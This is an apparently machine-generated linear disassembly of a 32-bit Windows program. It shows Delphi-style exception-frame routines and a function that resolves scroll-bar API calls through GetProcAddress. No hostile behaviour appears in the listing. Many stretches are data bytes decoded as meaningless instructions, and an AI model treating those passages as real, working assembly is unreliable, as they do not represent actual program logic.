add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x14004033 ] al
inc ebp
dec eax
insb
jo r-xdata
add [ eax - 0x27ffbf8c ] dl
jae r-xdata
int1
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x40042f0 ] bh
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
jns r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42f174c0 ]
int1
inc edx
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
outsb
je r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42fddf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
push esi
je r-xdata
dec ecx
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
int1
inc edx
add bh bh
push [ ecx + esi * 8 ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0xf0b87265
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
adc ecx [ ecx + 0x45 ]
insd
movsb [ edi ] [ esi ]
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404174
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xf0f47265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax * 2 + 0x706c6548 ] dl
push ebx
outsb
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42f0f8c0 ]
add [ edi ] cl
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0x5800408d
inc edx
add [ eax ] al
add [ eax ] al
jae r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
movsb [ edi ] [ esi ]
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fde6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
inc ebx
xor edi edi
int3
mov eax eax
lea eax [ eax ]
hlt
add bh bh
dec [ ebp - 0xe0bffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f040
retn
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
jae r-xdata
adc [ ecx + 0x43 ] ecx
jne r-xdata
add [ edi ] cl
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42e574
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b68
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
dec [ ebx + 0x42f088c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_42f303
xchg ebp eax
inc edx
add [ edi - 0x56ffbd0e ] bl
inc edx
add [ ebp - 0xe ] bh
std
dec esp
int3
cmp al [ ebx ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jecxz r-xdata
cmp bl [ ebx ]
inc edx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
enter 0x42f3 0x0
aas
inc edx
add [ eax ] al
add [ eax ] al
add al cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
inc edx
add [ eax ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe0042ff ] ch
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + esi * 8 + 0x42 ] cl
add [ eax + eax ] cl
add [ eax ] al
hlt
jge sub_42f303
add ch ch
inc edx
add bh dh
inc edx
add [ ebx - 0x44ffbd0e ] dh
inc edx
add bl al
inc edx
add bl cl
inc edx
add bl dl
inc edx
add bl bl
inc edx
add [ edx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
inc edx
add [ ebp - 0x72ffbd0e ] al
inc edx
add bl ah
inc edx
sub_42f410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42f486
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42f59c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405b68
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f48d
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f528
mov [ rw-data ] eax
sub_42f494
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f528
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405b94
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42f4ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405b68
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f528
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e538
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e538
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e538
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404120
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f59c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f69d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f4ec
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42e588
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d7b0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d7b0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f4ec
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42e588
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f4ec
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42e588
mov ecx r-xdata
call sub_405b94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f6a4
lea eax [ ebp - 0xc ]
call sub_405b50
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
sub edx 0xfffffff8
sub_42f6bc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42f6fc
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42f72c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f8be
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f859
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8c5
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
mov eax esi
xor edx edx
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42e574
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42e574
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42f8cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42f9b1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9b8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42e574
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b68
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42e574
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b68
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42fbe8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42fcdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fce2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x10 ]
call sub_405b50
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42e574
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405b68
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42fd00
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42fddf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404174
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fde6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42e574
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b68
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42fe00
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405bc4
xor eax eax
push ebp
push sub_42fe4f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fe56
lea eax [ ebx + 0xc ]
call sub_405b50
sub_42fe5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_42fef1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404174
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42fbe8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fef8
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
call sub_42f6fc
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42f72c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42f8cc
sub_42ff1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42e574
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42e574
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41b544
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42e574
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41b544
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41b544
sub_42ffa8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_42f6bc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403390
mov eax [ esi + 0x14 ]
call sub_403390
mov eax [ esi + 0x10 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405b50
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42fffc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430033
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43003a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_430044
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430069
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430070
retn
sub_43007c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4300ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4300b4
retn
mov eax [ rw-data ]
call sub_403390
sub_4300c0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_4300f4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_43011c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_43039e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4303c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4303cc
retn
sub_4303e0
sub al 0x4
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] dh
inc ebx
add [ eax + eax ] al
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x53ffbfcd ] al
add al 0x43
add [ eax + 0xe004304 ] dh
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x70 ] si
add al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004304 ] bl
add [ eax ] al
add al ah
add eax [ ebx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add ah dh
add al 0x43
add [ eax + 0x5300043 ] ah
inc ebx
